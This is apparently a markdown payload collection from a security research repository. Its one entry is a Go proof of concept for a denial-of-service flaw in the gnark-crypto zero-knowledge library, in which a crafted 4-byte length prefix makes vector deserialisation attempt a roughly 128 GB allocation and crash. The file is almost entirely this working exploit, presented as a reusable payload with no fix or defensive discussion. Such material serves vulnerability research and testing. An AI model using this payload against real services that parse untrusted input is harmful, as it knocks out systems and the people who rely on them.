# Payloads — zk

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. 🛡️ Critical DoS Vulnerability in Ethereum ZK Library gnark-crypto
- Source: `telegram writeups (verbatim excerpts)`

```
package main
import (
    "bytes"
    "encoding/binary"
    "fmt"
    "log"
    "github.com/consensys/gnark-crypto/ecc/bn254/fr"
)
func main() {
    // Craft malicious payload: just 4 bytes claiming 4 billion elements
    maliciousLength := uint32(0xFFFFFFFF)
    
    buf := new(bytes.Buffer)
    if err := binary.Write(buf, binary.BigEndian, maliciousLength); err != nil {
        log.Fatal(err)
    }
    
    // This will attempt to allocate ~128 GB and crash
    var vec fr.Vector
    _, err := vec.ReadFrom(buf)
    if err != nil {
        fmt.Printf("Error: %v\n", err)
    }
}
```
